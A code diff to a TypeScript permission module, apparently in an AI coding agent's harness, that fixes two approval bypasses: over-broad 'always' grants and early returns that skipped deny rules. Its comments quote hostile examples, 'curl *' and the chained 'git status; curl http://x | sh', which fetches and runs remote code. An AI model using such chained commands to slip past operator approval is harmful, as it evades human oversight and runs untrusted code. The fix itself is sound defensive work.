@@ -154,6 +154,19 @@ export namespace Permission {
     return action
   }
 
+  /**
+   * "Always" must grant only what the operator was shown. Callers build one
+   * always-entry per pattern they submitted, so an approval raised for one
+   * pattern used to persist allow rules for every other pattern in the same
+   * request - approving "git status" could permanently allow "curl *". Keep the
+   * entries that cover a pattern which actually needed approval, and fall back
+   * to those patterns themselves rather than granting the caller's whole list.
+   */
+  function scopeAlways(needsApproval: string[], always: string[]): string[] {
+    const scoped = always.filter((entry) => needsApproval.some((pattern) => Wildcard.match(pattern, entry)))
+    return scoped.length > 0 ? scoped : needsApproval
+  }
+
   function classificationDescription(classification: PathClassification | undefined): string | undefined {
     if (!classification) return undefined
     if (classification.zone === "forbidden") {
@@ -176,6 +189,11 @@ export namespace Permission {
           classificationDescription(forbidden),
         )
       }
+      // Classify every pattern before prompting for any of them. Returning from
+      // inside this loop at the first "ask" meant a deny rule on a later
+      // pattern was never evaluated, so "git status; curl http://x | sh"
+      // prompted about git status and then ran the whole line on approval.
+      const needsApproval: string[] = []
       for (const pattern of request.patterns ?? []) {
         const rule = evaluate(request.permission, pattern, ruleset, s.approved)
         const classification = classifications.get(pattern)
@@ -200,32 +218,37 @@ export namespace Permission {
             ruleset.filter((r) => Wildcard.match(request.permission, r.permission)),
             classificationDescription(classification),
           )
-        if (action === "ask") {
-          const id = input.id ?? Identifier.ascending("permission")
-          return new Promise<void>((resolve, reject) => {
-            const description = classificationDescription(classification)
-            const info: Request = {
-              id,
-              createdAt: input.createdAt ?? Date.now(),
-              ...request,
-              metadata: description
-                ? {
-                    ...request.metadata,
-                    description: request.metadata.description ?? description,
-                    rustPolicy: classification,
-                  }
-                : request.metadata,
-            }
-            s.pending[id] = {
-              info,
-              resolve,
-              reject,
-            }
-            Bus.publish(Event.Asked, info)
-          })
-        }
-        if (action === "allow") continue
+        if (action === "ask") needsApproval.push(pattern)
       }
+
+      if (needsApproval.length === 0) return
+
+      const id = input.id ?? Identifier.ascending("permission")
+      return new Promise<void>((resolve, reject) => {
+        const classification = classifications.get(needsApproval[0]!)
+        const description = classificationDescription(classification)
+        const info: Request = {
+          id,
+          createdAt: input.createdAt ?? Date.now(),
+          ...request,
+          // Show, and later grant, only what actually needs approval.
+          patterns: needsApproval,
+          always: scopeAlways(needsApproval, request.always ?? []),
+          metadata: description
+            ? {
+                ...request.metadata,
+                description: request.metadata.description ?? description,
+                rustPolicy: classification,
+              }
+            : request.metadata,
+        }
+        s.pending[id] = {
+          info,
+          resolve,
+          reject,
+        }
+        Bus.publish(Event.Asked, info)
+      })
     },
   )
 
